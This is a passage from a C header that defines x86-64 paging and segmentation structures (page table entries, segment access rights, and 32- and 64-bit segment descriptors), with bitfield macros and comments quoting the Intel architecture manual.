#define PT_ENTRY_64_PAGE_LEVEL_CACHE_DISABLE(_)                      (((_) >> 4) & 0x01)
        UINT64 Accessed : 1;
#define PT_ENTRY_64_ACCESSED_BIT                                     5
#define PT_ENTRY_64_ACCESSED_FLAG                                    0x20
#define PT_ENTRY_64_ACCESSED_MASK                                    0x01
#define PT_ENTRY_64_ACCESSED(_)                                      (((_) >> 5) & 0x01)
        UINT64 Dirty : 1;
#define PT_ENTRY_64_DIRTY_BIT                                        6
#define PT_ENTRY_64_DIRTY_FLAG                                       0x40
#define PT_ENTRY_64_DIRTY_MASK                                       0x01
#define PT_ENTRY_64_DIRTY(_)                                         (((_) >> 6) & 0x01)
        UINT64 LargePage : 1;
#define PT_ENTRY_64_LARGE_PAGE_BIT                                   7
#define PT_ENTRY_64_LARGE_PAGE_FLAG                                  0x80
#define PT_ENTRY_64_LARGE_PAGE_MASK                                  0x01
#define PT_ENTRY_64_LARGE_PAGE(_)                                    (((_) >> 7) & 0x01)
        UINT64 Global : 1;
#define PT_ENTRY_64_GLOBAL_BIT                                       8
#define PT_ENTRY_64_GLOBAL_FLAG                                      0x100
#define PT_ENTRY_64_GLOBAL_MASK                                      0x01
#define PT_ENTRY_64_GLOBAL(_)                                        (((_) >> 8) & 0x01)

        /**
         * [Bits 11:9] Ignored.
         */
        UINT64 Ignored1 : 3;
#define PT_ENTRY_64_IGNORED_1_BIT                                    9
#define PT_ENTRY_64_IGNORED_1_FLAG                                   0xE00
#define PT_ENTRY_64_IGNORED_1_MASK                                   0x07
#define PT_ENTRY_64_IGNORED_1(_)                                     (((_) >> 9) & 0x07)

        /**
         * [Bits 47:12] Physical address of the 4-KByte page referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define PT_ENTRY_64_PAGE_FRAME_NUMBER_BIT                            12
#define PT_ENTRY_64_PAGE_FRAME_NUMBER_FLAG                           0xFFFFFFFFF000
#define PT_ENTRY_64_PAGE_FRAME_NUMBER_MASK                           0xFFFFFFFFF
#define PT_ENTRY_64_PAGE_FRAME_NUMBER(_)                             (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved1 : 4;

        /**
         * [Bits 58:52] Ignored.
         */
        UINT64 Ignored2 : 7;
#define PT_ENTRY_64_IGNORED_2_BIT                                    52
#define PT_ENTRY_64_IGNORED_2_FLAG                                   0x7F0000000000000
#define PT_ENTRY_64_IGNORED_2_MASK                                   0x7F
#define PT_ENTRY_64_IGNORED_2(_)                                     (((_) >> 52) & 0x7F)
        UINT64 ProtectionKey : 4;
#define PT_ENTRY_64_PROTECTION_KEY_BIT                               59
#define PT_ENTRY_64_PROTECTION_KEY_FLAG                              0x7800000000000000
#define PT_ENTRY_64_PROTECTION_KEY_MASK                              0x0F
#define PT_ENTRY_64_PROTECTION_KEY(_)                                (((_) >> 59) & 0x0F)
        UINT64 ExecuteDisable : 1;
#define PT_ENTRY_64_EXECUTE_DISABLE_BIT                              63
#define PT_ENTRY_64_EXECUTE_DISABLE_FLAG                             0x8000000000000000
#define PT_ENTRY_64_EXECUTE_DISABLE_MASK                             0x01
#define PT_ENTRY_64_EXECUTE_DISABLE(_)                               (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} PT_ENTRY_64;

/**
 * @defgroup PAGING_STRUCTURES_ENTRY_COUNT_64 \
 *           Paging structures entry counts
 *
 * Paging structures entry counts.
 * @{
 */
#define PML4E_ENTRY_COUNT_64                                         0x00000200
#define PDPTE_ENTRY_COUNT_64                                         0x00000200
#define PDE_ENTRY_COUNT_64                                           0x00000200
#define PTE_ENTRY_COUNT_64                                           0x00000200
 /**
  * @}
  */

  /**
   * @}
   */

   /**
    * @}
    */

    /**
     * @defgroup SEGMENT_DESCRIPTORS \
     *           Segment descriptors
     * @{
     */
     /**
      * @brief Pseudo-Descriptor Format (32-bit)
      *
      * @see Vol3A[3.5.1(Segment Descriptor Tables)] (reference)
      */
#pragma pack(push, 1)
typedef struct
{
    /**
     * Limit.
     */
    UINT16 Limit;

    /**
     * Base Address.
     */
    UINT32 BaseAddress;
} SEGMENT_DESCRIPTOR_REGISTER_32;
#pragma pack(pop)

/**
 * @brief Pseudo-Descriptor Format (64-bit)
 *
 * @see Vol3A[3.5.1(Segment Descriptor Tables)] (reference)
 */
#pragma pack(push, 1)
typedef struct
{
    /**
     * Limit.
     */
    UINT16 Limit;

    /**
     * Base Address.
     */
    UINT64 BaseAddress;
} SEGMENT_DESCRIPTOR_REGISTER_64;
#pragma pack(pop)

/**
 * @brief Segment access rights
 *
 * @see Vol2A[3.2(Instructions (A-L) | LAR-Load Access Rights Byte)] (reference)
 */
typedef union
{
    struct
    {
        UINT32 Reserved1 : 8;

        /**
         * @brief Type field
         *
         * [Bits 11:8] Indicates the segment or gate type and specifies the kinds of access that can be made to the segment and the
         * direction of growth. The interpretation of this field depends on whether the descriptor type flag specifies an
         * application (code or data) descriptor or a system descriptor. The encoding of the type field is different for code,
         * data, and system descriptors.
         *
         * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
         */
        UINT32 Type : 4;
#define SEGMENT_ACCESS_RIGHTS_TYPE_BIT                               8
#define SEGMENT_ACCESS_RIGHTS_TYPE_FLAG                              0xF00
#define SEGMENT_ACCESS_RIGHTS_TYPE_MASK                              0x0F
#define SEGMENT_ACCESS_RIGHTS_TYPE(_)                                (((_) >> 8) & 0x0F)

        /**
         * @brief S (descriptor type) flag
         *
         * [Bit 12] Specifies whether the segment descriptor is for a system segment (S flag is clear) or a code or data segment (S
         * flag is set).
         */
        UINT32 DescriptorType : 1;
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_BIT                    12
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_FLAG                   0x1000
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_MASK                   0x01
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE(_)                     (((_) >> 12) & 0x01)

        /**
         * @brief DPL (descriptor privilege level) field
         *
         * [Bits 14:13] Specifies the privilege level of the segment. The privilege level can range from 0 to 3, with 0 being the
         * most privileged level. The DPL is used to control access to the segment. See Section 5.5, "Privilege Levels", for a
         * description of the relationship of the DPL to the CPL of the executing code segment and the RPL of a segment selector.
         */
        UINT32 DescriptorPrivilegeLevel : 2;
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_BIT         13
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_FLAG        0x6000
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_MASK        0x03
#define SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL(_)          (((_) >> 13) & 0x03)

        /**
         * @brief P (segment-present) flag
         *
         * [Bit 15] Indicates whether the segment is present in memory (set) or not present (clear). If this flag is clear, the
         * processor generates a segment-not-present exception (\#NP) when a segment selector that points to the segment descriptor
         * is loaded into a segment register. Memory management software can use this flag to control which segments are actually
         * loaded into physical memory at a given time. It offers a control in addition to paging for managing virtual memory.
         */
        UINT32 Present : 1;
#define SEGMENT_ACCESS_RIGHTS_PRESENT_BIT                            15
#define SEGMENT_ACCESS_RIGHTS_PRESENT_FLAG                           0x8000
#define SEGMENT_ACCESS_RIGHTS_PRESENT_MASK                           0x01
#define SEGMENT_ACCESS_RIGHTS_PRESENT(_)                             (((_) >> 15) & 0x01)
        UINT32 Reserved2 : 4;

        /**
         * @brief Available bit
         *
         * [Bit 20] Bit 20 of the second doubleword of the segment descriptor is available for use by system software.
         */
        UINT32 System : 1;
#define SEGMENT_ACCESS_RIGHTS_SYSTEM_BIT                             20
#define SEGMENT_ACCESS_RIGHTS_SYSTEM_FLAG                            0x100000
#define SEGMENT_ACCESS_RIGHTS_SYSTEM_MASK                            0x01
#define SEGMENT_ACCESS_RIGHTS_SYSTEM(_)                              (((_) >> 20) & 0x01)

        /**
         * @brief L (64-bit code segment) flag
         *
         * [Bit 21] In IA-32e mode, bit 21 of the second doubleword of the segment descriptor indicates whether a code segment
         * contains native 64-bit code. A value of 1 indicates instructions in this code segment are executed in 64-bit mode. A
         * value of 0 indicates the instructions in this code segment are executed in compatibility mode. If L-bit is set, then
         * D-bit must be cleared. When not in IA-32e mode or for non-code segments, bit 21 is reserved and should always be set to
         * 0.
         */
        UINT32 LongMode : 1;
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE_BIT                          21
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE_FLAG                         0x200000
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE_MASK                         0x01
#define SEGMENT_ACCESS_RIGHTS_LONG_MODE(_)                           (((_) >> 21) & 0x01)

        /**
         * @brief D/B (default operation size/default stack pointer size and/or upper bound) flag
         *
         * [Bit 22] Performs different functions depending on whether the segment descriptor is an executable code segment, an
         * expand-down data segment, or a stack segment. (This flag should always be set to 1 for 32-bit code and data segments and
         * to 0 for 16-bit code and data segments.)
         * - Executable code segment. The flag is called the D flag and it indicates the default length for effective addresses and
         * operands referenced by instructions in the segment. If the flag is set, 32-bit addresses and 32-bit or 8-bit operands
         * are assumed; if it is clear, 16-bit addresses and 16-bit or 8-bit operands are assumed. The instruction prefix 66H can
         * be used to select an operand size other than the default, and the prefix 67H can be used select an address size other
         * than the default.
         * - Stack segment (data segment pointed to by the SS register). The flag is called the B (big) flag and it specifies the
         * size of the stack pointer used for implicit stack operations (such as pushes, pops, and calls). If the flag is set, a
         * 32-bit stack pointer is used, which is stored in the 32-bit ESP register; if the flag is clear, a 16-bit stack pointer
         * is used, which is stored in the 16- bit SP register. If the stack segment is set up to be an expand-down data segment
         * (described in the next paragraph), the B flag also specifies the upper bound of the stack segment.
         * - Expand-down data segment. The flag is called the B flag and it specifies the upper bound of the segment. If the flag
         * is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is clear, the upper bound is FFFFH (64 KBytes).
         */
        UINT32 DefaultBig : 1;
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_BIT                        22
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_FLAG                       0x400000
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_MASK                       0x01
#define SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG(_)                         (((_) >> 22) & 0x01)

        /**
         * @brief G (granularity) flag
         *
         * [Bit 23] Determines the scaling of the segment limit field. When the granularity flag is clear, the segment limit is
         * interpreted in byte units; when flag is set, the segment limit is interpreted in 4-KByte units. (This flag does not
         * affect the granularity of the base address; it is always byte granular.) When the granularity flag is set, the twelve
         * least significant bits of an offset are not tested when checking the offset against the segment limit. For example, when
         * the granularity flag is set, a limit of 0 results in valid offsets from 0 to 4095.
         */
        UINT32 Granularity : 1;
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY_BIT                        23
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY_FLAG                       0x800000
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY_MASK                       0x01
#define SEGMENT_ACCESS_RIGHTS_GRANULARITY(_)                         (((_) >> 23) & 0x01)
        UINT32 Reserved3 : 8;
    };

    UINT32 Flags;
} SEGMENT_ACCESS_RIGHTS;

/**
 * @brief General Segment Descriptor (32-bit)
 *
 * A segment descriptor is a data structure in a GDT or LDT that provides the processor with the size and location of a
 * segment, as well as access control and status information. Segment descriptors are typically created by compilers,
 * linkers, loaders, or the operating system or executive, but not application programs.
 *
 * @see Vol3A[5.2(FIELDS AND FLAGS USED FOR SEGMENT-LEVEL AND PAGE-LEVEL PROTECTION)]
 * @see Vol3A[5.2.1(Code-Segment Descriptor in 64-bit Mode)]
 * @see Vol3A[5.8.3(Call Gates)]
 * @see Vol3A[6.11(IDT DESCRIPTORS)]
 * @see Vol3A[6.14.1(64-Bit Mode IDT)]
 * @see Vol3A[7.2.2(TSS Descriptor)]
 * @see Vol3A[7.2.3(TSS Descriptor in 64-bit mode)]
 * @see Vol3A[7.2.5(Task-Gate Descriptor)]
 * @see Vol3A[3.4.5(Segment Descriptors)] (reference)
 */
typedef struct
{
    /**
     * @brief Segment limit field (15:00)
     *
     * Specifies the size of the segment. The processor puts together the two segment limit fields to form a 20-bit value. The
     * processor interprets the segment limit in one of two ways, depending on the setting of the G (granularity) flag:
     * - If the granularity flag is clear, the segment size can range from 1 byte to 1 MByte, in byte increments.
     * - If the granularity flag is set, the segment size can range from 4 KBytes to 4 GBytes, in 4-KByte increments.
     * The processor uses the segment limit in two different ways, depending on whether the segment is an expand-up or an
     * expand-down segment. For expand-up segments, the offset in a logical address can range from 0 to the segment limit.
     * Offsets greater than the segment limit generate general-protection exceptions (\#GP, for all segments other than SS) or
     * stack-fault exceptions (\#SS for the SS segment). For expand-down segments, the segment limit has the reverse function;
     * the offset can range from the segment limit plus 1 to FFFFFFFFH or FFFFH, depending on the setting of the B flag.
     * Offsets less than or equal to the segment limit generate general-protection exceptions or stack-fault exceptions.
     * Decreasing the value in the segment limit field for an expanddown segment allocates new memory at the bottom of the
     * segment's address space, rather than at the top. IA-32 architecture stacks always grow downwards, making this mechanism
     * convenient for expandable stacks.
     *
     * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
     */
    UINT16 SegmentLimitLow;

    /**
     * @brief Base address field (15:00)
     *
     * Defines the location of byte 0 of the segment within the 4-GByte linear address space. The processor puts together the
     * three base address fields to form a single 32-bit value. Segment base addresses should be aligned to 16-byte boundaries.
     * Although 16-byte alignment is not required, this alignment allows programs to maximize performance by aligning code and
     * data on 16-byte boundaries.
     */
    UINT16 BaseAddressLow;
    /**
     * @brief Segment descriptor fields
     */
    union
    {
        struct
        {
            /**
             * [Bits 7:0] Base address field (23:16); see description of $BASE_LOW for more details.
             */
            UINT32 BaseAddressMiddle : 8;
#define SEGMENT__BASE_ADDRESS_MIDDLE_BIT                             0
#define SEGMENT__BASE_ADDRESS_MIDDLE_FLAG                            0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE_MASK                            0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE(_)                              (((_) >> 0) & 0xFF)

            /**
             * @brief Type field
             *
             * [Bits 11:8] Indicates the segment or gate type and specifies the kinds of access that can be made to the segment and the
             * direction of growth. The interpretation of this field depends on whether the descriptor type flag specifies an
             * application (code or data) descriptor or a system descriptor. The encoding of the type field is different for code,
             * data, and system descriptors.
             *
             * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
             */
            UINT32 Type : 4;
#define SEGMENT__TYPE_BIT                                            8
#define SEGMENT__TYPE_FLAG                                           0xF00
#define SEGMENT__TYPE_MASK                                           0x0F
#define SEGMENT__TYPE(_)                                             (((_) >> 8) & 0x0F)

            /**
             * @brief S (descriptor type) flag
             *
             * [Bit 12] Specifies whether the segment descriptor is for a system segment (S flag is clear) or a code or data segment (S
             * flag is set).
             */
            UINT32 DescriptorType : 1;
#define SEGMENT__DESCRIPTOR_TYPE_BIT                                 12
#define SEGMENT__DESCRIPTOR_TYPE_FLAG                                0x1000
#define SEGMENT__DESCRIPTOR_TYPE_MASK                                0x01
#define SEGMENT__DESCRIPTOR_TYPE(_)                                  (((_) >> 12) & 0x01)

            /**
             * @brief DPL (descriptor privilege level) field
             *
             * [Bits 14:13] Specifies the privilege level of the segment. The privilege level can range from 0 to 3, with 0 being the
             * most privileged level. The DPL is used to control access to the segment. See Section 5.5, "Privilege Levels", for a
             * description of the relationship of the DPL to the CPL of the executing code segment and the RPL of a segment selector.
             */
            UINT32 DescriptorPrivilegeLevel : 2;
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_BIT                      13
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_FLAG                     0x6000
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_MASK                     0x03
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL(_)                       (((_) >> 13) & 0x03)

            /**
             * @brief P (segment-present) flag
             *
             * [Bit 15] Indicates whether the segment is present in memory (set) or not present (clear). If this flag is clear, the
             * processor generates a segment-not-present exception (\#NP) when a segment selector that points to the segment descriptor
             * is loaded into a segment register. Memory management software can use this flag to control which segments are actually
             * loaded into physical memory at a given time. It offers a control in addition to paging for managing virtual memory.
             */
            UINT32 Present : 1;
#define SEGMENT__PRESENT_BIT                                         15
#define SEGMENT__PRESENT_FLAG                                        0x8000
#define SEGMENT__PRESENT_MASK                                        0x01
#define SEGMENT__PRESENT(_)                                          (((_) >> 15) & 0x01)

            /**
             * [Bits 19:16] Segment limit field (19:16); see description of $LIMIT_LOW for more details.
             */
            UINT32 SegmentLimitHigh : 4;
#define SEGMENT__SEGMENT_LIMIT_HIGH_BIT                              16
#define SEGMENT__SEGMENT_LIMIT_HIGH_FLAG                             0xF0000
#define SEGMENT__SEGMENT_LIMIT_HIGH_MASK                             0x0F
#define SEGMENT__SEGMENT_LIMIT_HIGH(_)                               (((_) >> 16) & 0x0F)

            /**
             * @brief Available bit
             *
             * [Bit 20] Bit 20 of the second doubleword of the segment descriptor is available for use by system software.
             */
            UINT32 System : 1;
#define SEGMENT__SYSTEM_BIT                                          20
#define SEGMENT__SYSTEM_FLAG                                         0x100000
#define SEGMENT__SYSTEM_MASK                                         0x01
#define SEGMENT__SYSTEM(_)                                           (((_) >> 20) & 0x01)

            /**
             * @brief L (64-bit code segment) flag
             *
             * [Bit 21] In IA-32e mode, bit 21 of the second doubleword of the segment descriptor indicates whether a code segment
             * contains native 64-bit code. A value of 1 indicates instructions in this code segment are executed in 64-bit mode. A
             * value of 0 indicates the instructions in this code segment are executed in compatibility mode. If L-bit is set, then
             * D-bit must be cleared. When not in IA-32e mode or for non-code segments, bit 21 is reserved and should always be set to
             * 0.
             */
            UINT32 LongMode : 1;
#define SEGMENT__LONG_MODE_BIT                                       21
#define SEGMENT__LONG_MODE_FLAG                                      0x200000
#define SEGMENT__LONG_MODE_MASK                                      0x01
#define SEGMENT__LONG_MODE(_)                                        (((_) >> 21) & 0x01)

            /**
             * @brief D/B (default operation size/default stack pointer size and/or upper bound) flag
             *
             * [Bit 22] Performs different functions depending on whether the segment descriptor is an executable code segment, an
             * expand-down data segment, or a stack segment. (This flag should always be set to 1 for 32-bit code and data segments and
             * to 0 for 16-bit code and data segments.)
             * - Executable code segment. The flag is called the D flag and it indicates the default length for effective addresses and
             * operands referenced by instructions in the segment. If the flag is set, 32-bit addresses and 32-bit or 8-bit operands
             * are assumed; if it is clear, 16-bit addresses and 16-bit or 8-bit operands are assumed. The instruction prefix 66H can
             * be used to select an operand size other than the default, and the prefix 67H can be used select an address size other
             * than the default.
             * - Stack segment (data segment pointed to by the SS register). The flag is called the B (big) flag and it specifies the
             * size of the stack pointer used for implicit stack operations (such as pushes, pops, and calls). If the flag is set, a
             * 32-bit stack pointer is used, which is stored in the 32-bit ESP register; if the flag is clear, a 16-bit stack pointer
             * is used, which is stored in the 16- bit SP register. If the stack segment is set up to be an expand-down data segment
             * (described in the next paragraph), the B flag also specifies the upper bound of the stack segment.
             * - Expand-down data segment. The flag is called the B flag and it specifies the upper bound of the segment. If the flag
             * is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is clear, the upper bound is FFFFH (64 KBytes).
             */
            UINT32 DefaultBig : 1;
#define SEGMENT__DEFAULT_BIG_BIT                                     22
#define SEGMENT__DEFAULT_BIG_FLAG                                    0x400000
#define SEGMENT__DEFAULT_BIG_MASK                                    0x01
#define SEGMENT__DEFAULT_BIG(_)                                      (((_) >> 22) & 0x01)

            /**
             * @brief G (granularity) flag
             *
             * [Bit 23] Determines the scaling of the segment limit field. When the granularity flag is clear, the segment limit is
             * interpreted in byte units; when flag is set, the segment limit is interpreted in 4-KByte units. (This flag does not
             * affect the granularity of the base address; it is always byte granular.) When the granularity flag is set, the twelve
             * least significant bits of an offset are not tested when checking the offset against the segment limit. For example, when
             * the granularity flag is set, a limit of 0 results in valid offsets from 0 to 4095.
             */
            UINT32 Granularity : 1;
#define SEGMENT__GRANULARITY_BIT                                     23
#define SEGMENT__GRANULARITY_FLAG                                    0x800000
#define SEGMENT__GRANULARITY_MASK                                    0x01
#define SEGMENT__GRANULARITY(_)                                      (((_) >> 23) & 0x01)

            /**
             * [Bits 31:24] Base address field (31:24); see description of $BASE_LOW for more details.
             */
            UINT32 BaseAddressHigh : 8;
#define SEGMENT__BASE_ADDRESS_HIGH_BIT                               24
#define SEGMENT__BASE_ADDRESS_HIGH_FLAG                              0xFF000000
#define SEGMENT__BASE_ADDRESS_HIGH_MASK                              0xFF
#define SEGMENT__BASE_ADDRESS_HIGH(_)                                (((_) >> 24) & 0xFF)
        };

        UINT32 Flags;
    };

} SEGMENT_DESCRIPTOR_32;

/**
 * @brief General Segment Descriptor (64-bit)
 *
 * A segment descriptor is a data structure in a GDT or LDT that provides the processor with the size and location of a
 * segment, as well as access control and status information. Segment descriptors are typically created by compilers,
 * linkers, loaders, or the operating system or executive, but not application programs.
 *
 * @see Vol3A[3.4.5(Segment Descriptors)] (reference)
 */
typedef struct
{
    /**
     * @brief Segment limit field (15:00)
     *
     * Specifies the size of the segment. The processor puts together the two segment limit fields to form a 20-bit value. The
     * processor interprets the segment limit in one of two ways, depending on the setting of the G (granularity) flag:
     * - If the granularity flag is clear, the segment size can range from 1 byte to 1 MByte, in byte increments.
     * - If the granularity flag is set, the segment size can range from 4 KBytes to 4 GBytes, in 4-KByte increments.
     * The processor uses the segment limit in two different ways, depending on whether the segment is an expand-up or an
     * expand-down segment. For expand-up segments, the offset in a logical address can range from 0 to the segment limit.
     * Offsets greater than the segment limit generate general-protection exceptions (\#GP, for all segments other than SS) or
     * stack-fault exceptions (\#SS for the SS segment). For expand-down segments, the segment limit has the reverse function;
     * the offset can range from the segment limit plus 1 to FFFFFFFFH or FFFFH, depending on the setting of the B flag.
     * Offsets less than or equal to the segment limit generate general-protection exceptions or stack-fault exceptions.
     * Decreasing the value in the segment limit field for an expanddown segment allocates new memory at the bottom of the
     * segment's address space, rather than at the top. IA-32 architecture stacks always grow downwards, making this mechanism
     * convenient for expandable stacks.
     *
     * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
     */
    UINT16 SegmentLimitLow;

    /**
     * @brief Base address field (15:00)
     *
     * Defines the location of byte 0 of the segment within the 4-GByte linear address space. The processor puts together the
     * three base address fields to form a single 32-bit value. Segment base addresses should be aligned to 16-byte boundaries.
     * Although 16-byte alignment is not required, this alignment allows programs to maximize performance by aligning code and
     * data on 16-byte boundaries.
     */
    UINT16 BaseAddressLow;
    /**
     * @brief Segment descriptor fields
     */
    union
    {
        struct
        {
            /**
             * [Bits 7:0] Base address field (23:16); see description of $BASE_LOW for more details.
             */
            UINT32 BaseAddressMiddle : 8;
#define SEGMENT__BASE_ADDRESS_MIDDLE_BIT                             0
#define SEGMENT__BASE_ADDRESS_MIDDLE_FLAG                            0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE_MASK                            0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE(_)                              (((_) >> 0) & 0xFF)

            /**
             * @brief Type field
             *
             * [Bits 11:8] Indicates the segment or gate type and specifies the kinds of access that can be made to the segment and the
             * direction of growth. The interpretation of this field depends on whether the descriptor type flag specifies an
             * application (code or data) descriptor or a system descriptor. The encoding of the type field is different for code,
             * data, and system descriptors.
             *
             * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
             */
            UINT32 Type : 4;
#define SEGMENT__TYPE_BIT                                            8
#define SEGMENT__TYPE_FLAG                                           0xF00
#define SEGMENT__TYPE_MASK                                           0x0F
#define SEGMENT__TYPE(_)                                             (((_) >> 8) & 0x0F)

            /**
             * @brief S (descriptor type) flag
             *
             * [Bit 12] Specifies whether the segment descriptor is for a system segment (S flag is clear) or a code or data segment (S
             * flag is set).
             */
            UINT32 DescriptorType : 1;
#define SEGMENT__DESCRIPTOR_TYPE_BIT                                 12
#define SEGMENT__DESCRIPTOR_TYPE_FLAG                                0x1000
#define SEGMENT__DESCRIPTOR_TYPE_MASK                                0x01
#define SEGMENT__DESCRIPTOR_TYPE(_)                                  (((_) >> 12) & 0x01)

            /**
             * @brief DPL (descriptor privilege level) field
             *
             * [Bits 14:13] Specifies the privilege level of the segment. The privilege level can range from 0 to 3, with 0 being the
             * most privileged level. The DPL is used to control access to the segment. See Section 5.5, "Privilege Levels", for a
             * description of the relationship of the DPL to the CPL of the executing code segment and the RPL of a segment selector.
             */
            UINT32 DescriptorPrivilegeLevel : 2;
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_BIT                      13
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_FLAG                     0x6000
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_MASK                     0x03
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL(_)                       (((_) >> 13) & 0x03)

            /**
             * @brief P (segment-present) flag
             *
             * [Bit 15] Indicates whether the segment is present in memory (set) or not present (clear). If this flag is clear, the
             * processor generates a segment-not-present exception (\#NP) when a segment selector that points to the segment descriptor
             * is loaded into a segment register. Memory management software can use this flag to control which segments are actually
             * loaded into physical memory at a given time. It offers a control in addition to paging for managing virtual memory.
             */
            UINT32 Present : 1;
#define SEGMENT__PRESENT_BIT                                         15
#define SEGMENT__PRESENT_FLAG                                        0x8000
#define SEGMENT__PRESENT_MASK                                        0x01
#define SEGMENT__PRESENT(_)                                          (((_) >> 15) & 0x01)

            /**
             * [Bits 19:16] Segment limit field (19:16); see description of $LIMIT_LOW for more details.
             */
            UINT32 SegmentLimitHigh : 4;
#define SEGMENT__SEGMENT_LIMIT_HIGH_BIT                              16
#define SEGMENT__SEGMENT_LIMIT_HIGH_FLAG                             0xF0000
#define SEGMENT__SEGMENT_LIMIT_HIGH_MASK                             0x0F
#define SEGMENT__SEGMENT_LIMIT_HIGH(_)                               (((_) >> 16) & 0x0F)

            /**
             * @brief Available bit
             *
             * [Bit 20] Bit 20 of the second doubleword of the segment descriptor is available for use by system software.
             */
            UINT32 System : 1;
#define SEGMENT__SYSTEM_BIT                                          20
#define SEGMENT__SYSTEM_FLAG                                         0x100000
#define SEGMENT__SYSTEM_MASK                                         0x01
#define SEGMENT__SYSTEM(_)                                           (((_) >> 20) & 0x01)

            /**
             * @brief L (64-bit code segment) flag
             *
             * [Bit 21] In IA-32e mode, bit 21 of the second doubleword of the segment descriptor indicates whether a code segment
             * contains native 64-bit code. A value of 1 indicates instructions in this code segment are executed in 64-bit mode. A
             * value of 0 indicates the instructions in this code segment are executed in compatibility mode. If L-bit is set, then
             * D-bit must be cleared. When not in IA-32e mode or for non-code segments, bit 21 is reserved and should always be set to
             * 0.
             */
            UINT32 LongMode : 1;
#define SEGMENT__LONG_MODE_BIT                                       21
#define SEGMENT__LONG_MODE_FLAG                                      0x200000
#define SEGMENT__LONG_MODE_MASK                                      0x01
#define SEGMENT__LONG_MODE(_)                                        (((_) >> 21) & 0x01)

            /**
             * @brief D/B (default operation size/default stack pointer size and/or upper bound) flag
             *
             * [Bit 22] Performs different functions depending on whether the segment descriptor is an executable code segment, an
             * expand-down data segment, or a stack segment. (This flag should always be set to 1 for 32-bit code and data segments and
             * to 0 for 16-bit code and data segments.)
             * - Executable code segment. The flag is called the D flag and it indicates the default length for effective addresses and
             * operands referenced by instructions in the segment. If the flag is set, 32-bit addresses and 32-bit or 8-bit operands
             * are assumed; if it is clear, 16-bit addresses and 16-bit or 8-bit operands are assumed. The instruction prefix 66H can
             * be used to select an operand size other than the default, and the prefix 67H can be used select an address size other
             * than the default.
             * - Stack segment (data segment pointed to by the SS register). The flag is called the B (big) flag and it specifies the
             * size of the stack pointer used for implicit stack operations (such as pushes, pops, and calls). If the flag is set, a
             * 32-bit stack pointer is used, which is stored in the 32-bit ESP register; if the flag is clear, a 16-bit stack pointer
             * is used, which is stored in the 16- bit SP register. If the stack segment is set up to be an expand-down data segment
             * (described in the next paragraph), the B flag also specifies the upper bound of the stack segment.
             * - Expand-down data segment. The flag is called the B flag and it specifies the upper bound of the segment. If the flag
             * is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is clear, the upper bound is FFFFH (64 KBytes).
             */
            UINT32 DefaultBig : 1;
#define SEGMENT__DEFAULT_BIG_BIT                                     22
#define SEGMENT__DEFAULT_BIG_FLAG                                    0x400000
#define SEGMENT__DEFAULT_BIG_MASK                                    0x01
#define SEGMENT__DEFAULT_BIG(_)                                      (((_) >> 22) & 0x01)

            /**
             * @brief G (granularity) flag
             *
             * [Bit 23] Determines the scaling of the segment limit field. When the granularity flag is clear, the segment limit is
             * interpreted in byte units; when flag is set, the segment limit is interpreted in 4-KByte units. (This flag does not
             * affect the granularity of the base address; it is always byte granular.) When the granularity flag is set, the twelve
             * least significant bits of an offset are not tested when checking the offset against the segment limit. For example, when
             * the granularity flag is set, a limit of 0 results in valid offsets from 0 to 4095.
             */
            UINT32 Granularity : 1;
#define SEGMENT__GRANULARITY_BIT                                     23
#define SEGMENT__GRANULARITY_FLAG                                    0x800000
#define SEGMENT__GRANULARITY_MASK                                    0x01
#define SEGMENT__GRANULARITY(_)                                      (((_) >> 23) & 0x01)

            /**
             * [Bits 31:24] Base address field (31:24); see description of $BASE_LOW for more details.
             */
            UINT32 BaseAddressHigh : 8;
#define SEGMENT__BASE_ADDRESS_HIGH_BIT                               24
#define SEGMENT__BASE_ADDRESS_HIGH_FLAG                              0xFF000000
#define SEGMENT__BASE_ADDRESS_HIGH_MASK                              0xFF
#define SEGMENT__BASE_ADDRESS_HIGH(_)                                (((_) >> 24) & 0xFF)
        };

        UINT32 Flags;
    };


    /**
     * Base address field (32:63); see description of $BASE_LOW for more details.
     */
